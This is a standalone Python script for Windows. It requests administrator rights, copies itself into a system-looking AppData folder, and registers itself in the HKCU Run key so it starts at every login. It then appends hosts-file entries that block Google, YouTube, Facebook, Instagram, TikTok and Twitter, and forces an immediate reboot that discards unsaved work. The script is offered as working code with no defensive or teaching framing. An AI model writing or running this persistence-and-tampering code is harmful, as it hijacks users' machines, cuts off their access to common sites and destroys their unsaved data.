import os
import sys
import ctypes
import subprocess
import winreg
import shutil

def is_admin():
    """Check if the script is running with administrator privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except AttributeError:
        return False

def add_to_startup(app_name, exe_path):
    """Add the application to the current user's startup registry."""
    try:
        key = winreg.HKEY_CURRENT_USER
        sub_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, sub_key, 0, winreg.KEY_SET_VALUE) as startup_key:
            winreg.SetValueEx(startup_key, app_name, 0, winreg.REG_SZ, exe_path)
        print(f"[+] Added '{app_name}' to startup.")
        return True
    except PermissionError as err_startup_perm:
        print(f"[!] Permission denied when adding to startup: {err_startup_perm}")
        return False
    except Exception as err_startup:
        print(f"[!] Failed to add to startup: {err_startup}")
        return False

def copy_to_local():
    """Copy the current executable to the APPDATA local directory."""
    try:
        dest_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "MyApp")
        os.makedirs(dest_folder, exist_ok=True)
        dest_exe = os.path.join(dest_folder, "app.exe")

        if not os.path.exists(dest_exe):
            shutil.copy2(sys.executable, dest_exe)
            print(f"[+] Copied to {dest_exe}")
        else:
            print(f"[=] File already exists at {dest_exe}")

        return dest_exe
    except Exception as err_copy:
        print(f"[!] Failed to copy to local path: {err_copy}")
        return sys.executable  # fallback

def modify_hosts_file():
    """Append entries to the hosts file to block certain websites."""
    hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
    entries = [
        "127.0.0.1 www.facebook.com",
        "127.0.0.1 www.instagram.com",
        "127.0.0.1 www.youtube.com",
        "127.0.0.1 www.tiktok.com",
        "127.0.0.1 www.twitter.com",
        "127.0.0.1 facebook.com",
        "127.0.0.1 instagram.com",
        "127.0.0.1 youtube.com",
        "127.0.0.1 tiktok.com",
        "127.0.0.1 twitter.com",
        "127.0.0.1 www.google.com",
        "127.0.0.1 google.com"
    ]
    try:
        with open(hosts_path, "a", encoding="utf-8") as file:
            file.write("\n# Blocked by script\n")
            for line in entries:
                file.write(line + "\n")
        print("[+] Hosts file updated.")
    except PermissionError as err_hosts_perm:
        print(f"[!] Permission error updating hosts file: {err_hosts_perm}")
    except FileNotFoundError as err_hosts_missing:
        print(f"[!] Hosts file not found: {err_hosts_missing}")
    except Exception as err_hosts:
        print(f"[!] Failed to update hosts file: {err_hosts}")

def force_restart():
    """Force the system to restart immediately."""
    print("[!] Issuing system restart...")
    try:
        subprocess.run(["shutdown", "/r", "/t", "0", "/f"], check=True)
    except subprocess.CalledProcessError as err_restart:
        print(f"[!] Restart failed (process error): {err_restart}")
    except FileNotFoundError as err_no_cmd:
        print(f"[!] 'shutdown' command not found: {err_no_cmd}")
    except Exception as err_restart_general:
        print(f"[!] General error during restart: {err_restart_general}")

def main():
    """Main execution logic."""
    local_path = copy_to_local()
    add_to_startup("MyApp", local_path)
    modify_hosts_file()
    force_restart()

if __name__ == "__main__":
    if is_admin():
        main()
    else:
        print("[*] Requesting administrator privileges...")
        try:
            params = " ".join([f'"{arg}"' for arg in sys.argv])
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
        except Exception as err_elevate:
            print(f"[!] Failed to request elevation: {err_elevate}")
        sys.exit()


